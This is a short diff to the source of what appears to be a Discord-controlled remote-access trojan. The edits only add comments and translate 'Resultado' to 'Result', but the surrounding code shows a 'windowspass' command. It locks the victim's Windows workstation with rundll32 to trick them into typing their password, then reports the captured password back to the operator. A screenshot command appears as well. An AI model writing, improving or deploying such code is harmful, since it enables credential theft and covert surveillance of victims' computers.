@@ -8,8 +8,8 @@ import pyautogui
 
 #######################
 
-prefix = '$'
-token = 'TOKEN'
+prefix = '$' # u can change it
+token = 'TOKEN' # bot token
 bot = commands.Bot(command_prefix=prefix)
 cmds=f"""
 All commands:
@@ -117,9 +117,9 @@ async def windowspass(message, *,args=None):
 
             os.system('rundll32.exe user32.dll, LockWorkStation')
             await message.reply(f"**The exploit was injected to get the password correctly, but the victim did not write anything.**")
-        await message.reply(f"**The exploit was injected to get the password correctly!**\nResultado:\n---------------------------------------------\n{result2}")
+        await message.reply(f"**The exploit was injected to get the password correctly!**\nResult:\n---------------------------------------------\n{result2}")
     else:
-        await message.reply(f"**The exploit was injected to get the password correctly!**\nResultado:\n---------------------------------------------\n{result}")
+        await message.reply(f"**The exploit was injected to get the password correctly!**\nResult:\n---------------------------------------------\n{result}")
 
 @bot.command()
 async def screenshot(message):
